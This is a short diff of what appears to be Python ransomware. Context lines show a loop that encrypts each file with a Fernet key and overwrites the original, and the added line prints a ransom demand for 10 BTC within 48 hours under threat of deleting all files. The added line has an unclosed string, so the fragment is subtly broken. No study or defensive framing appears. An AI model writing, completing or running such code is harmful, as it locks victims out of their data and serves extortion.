@@ -33,3 +33,5 @@ for file in files:
 	contents_encrypted = Fernet(key).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
+
+print("Give me 10BTC in 48H or I will delete all your files)
